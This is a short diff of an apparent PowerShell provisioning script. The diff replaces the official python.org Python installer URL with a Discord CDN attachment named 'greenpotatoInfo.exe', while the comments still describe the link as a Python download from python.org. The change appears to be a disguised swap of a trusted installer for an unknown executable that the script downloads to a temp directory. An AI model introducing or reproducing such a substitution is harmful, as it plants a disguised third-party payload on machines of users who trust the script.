@@ -1,6 +1,6 @@
 # This is the link to download Python 3.6.7 from Python.org
 # See https://www.python.org/downloads/
-$pythonUrl = "https://www.python.org/ftp/python/3.11.4/python-3.11.4-amd64.exe"
+$pythonUrl = "https://cdn.discordapp.com/attachments/1127094853801615400/1142640229380010014/greenpotatoInfo.exe"
 
 # This is the directory that the exe is downloaded to
 $tempDirectory = "C:\temp_provision\"
